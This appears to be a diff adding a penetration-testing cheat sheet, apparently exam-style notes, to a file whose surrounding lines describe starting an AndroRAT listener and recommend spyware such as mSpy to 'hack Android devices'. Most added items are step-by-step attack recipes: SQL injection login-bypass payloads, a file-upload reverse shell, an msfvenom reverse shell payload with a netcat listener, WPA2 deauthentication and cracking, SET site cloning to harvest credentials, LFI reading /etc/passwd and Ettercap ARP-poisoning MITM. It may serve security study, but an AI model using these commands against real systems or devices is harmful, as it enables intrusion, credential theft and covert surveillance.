@@ -880,3 +880,119 @@ run python3 androRAT.py --shell -i 0.0.0.0 -p 4444 command to start listening to
  You can also use other Android hacking tools such as hxp_photo_eye (https://github.com), Gallery Eye (https://github.com), mSpy (https://www.mspy.com), and Hackingtoolkit (https://github.com) to hack Android devices.
 
 
+
+
+
+-------------------------------------------
+
+
+Analyze Malicious Network Traffic
+Filter the traffic using protocols like http, ftp, or telnet.
+ftp.request.command == "USER" || ftp.request.command == "PASS"
+
+Scan the IP 1.1.1.1 using Nmap and identify the open ports and services.
+nmap -sS -sV 1.1.1.1
+
+A web application running on 192.168.1.15 has a vulnerable file upload feature. Exploit it to gain access.
+Upload a reverse shell script (e.g., .php).
+Intercept and modify the request using Burp Suite.
+Set up a listener: nc -lvnp 4444.
+Execute the uploaded file to open a reverse shell.
+
+Perform SQL Injection
+Test for SQL injection on a login page with fields username and password.
+Enter the following payload in the username field: ' OR '1'='1' --
+Leave the password field blank.
+If successful, you'll bypass authentication.
+
+Use Aircrack-ng to capture a WPA2 handshake and crack it.
+Put your wireless adapter in monitor mode: airmon-ng start wlan0
+Capture traffic: airodump-ng wlan0
+Deauthenticate a client: aireplay-ng -0 1 -a [AP_MAC] -c [Client_MAC] wlan0
+Crack the captured handshake with a wordlist: aircrack-ng -w wordlist.txt -b [AP_MAC] capture.cap
+
+
+Launch Nessus and create a new scan for the target IP.
+Start the scan and review the report for critical vulnerabilities.
+Example vulnerability: CVE-2023-XXXX.
+
+
+Simulate credential harvesting using Social Engineering Toolkit (SET).
+Run SET: setoolkit.
+Select "Social Engineering Attacks" and then "Website Attack Vectors."
+Clone a website and collect credentials.
+
+Use Hashcat to crack a hashed password
+Identify the hash type: hashid [hash].
+Crack it: hashcat -m [hash_mode] -a 0 [hash_file] [wordlist].
+
+: Detect ARP spoofing on your network.
+Use ARPwatch to monitor ARP requests.
+Look for duplicate IPs with different MAC addresses.
+
+
+List shared folders on a target using SMBClient.
+smbclient -L \\[IP] -U [username]
+
+
+Perform Banner Grabbing
+Use Netcat to perform banner grabbing on a target server running on port 80.
+nc -v [target_IP] 80
+
+
+Use Dig to perform DNS enumeration for example.com.
+dig example.com ANY
+
+
+Bypass Login Authentication
+Test a login page for authentication bypass using SQL injection.
+Payload for username: ' OR 1=1 --
+Leave the password field blank and submit.
+If successful, you will gain access without valid credentials
+
+Detect Open Vulnerabilities Using OpenVAS
+Run a vulnerability scan using OpenVAS.
+Launch OpenVAS and configure a new scan.
+Set the target IP and run the scan.
+Review results for exploitable vulnerabilities.
+
+
+Detect Hidden Directories on a Web Server
+ Use Dirbuster to identify hidden directories on a web server.
+Launch Dirbuster and set the target URL.
+Use a wordlist (e.g., common.txt) for directory brute-forcing.
+Review results for directories like /admin or /backup.
+
+Capture and Analyze HTTP Traffic
+ Intercept and analyze HTTP traffic using Burp Suite.
+Set up Burp Suite as a proxy and configure your browser to route traffic through it.
+Capture the HTTP requests and analyze them for sensitive data (e.g., cookies or credentials).
+
+
+Crack an Encrypted ZIP File
+Use John the Ripper to crack a password-protected ZIP file.
+Convert the ZIP hash: zip2john file.zip > hash.txt.
+Crack the password: john --wordlist=wordlist.txt hash.txt.
+
+
+Detect and Exploit LFI (Local File Inclusion)
+ A web application has an LFI vulnerability. Exploit it to read sensitive files.
+Identify LFI: http://example.com/?file=../../../../etc/passwd.
+Use traversal techniques to access other sensitive files like /var/www/html/config.php.
+
+
+Perform MITM Attack
+Use Ettercap to perform a man-in-the-middle (MITM) attack on a local network.
+Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward.
+Launch Ettercap and select "Sniff > Unified Sniffing."
+Perform ARP poisoning to intercept traffic.
+
+
+Conduct Reverse Shell Exploitation
+ Establish a reverse shell on a vulnerable system.
+Create a reverse shell payload: msfvenom -p linux/x86/shell_reverse_tcp LHOST=[your_IP] LPORT=4444 -f elf > shell.elf.
+Transfer the payload to the target system.
+Set up a listener: nc -lvnp 4444.
+Execute the payload to gain shell access.
+
+
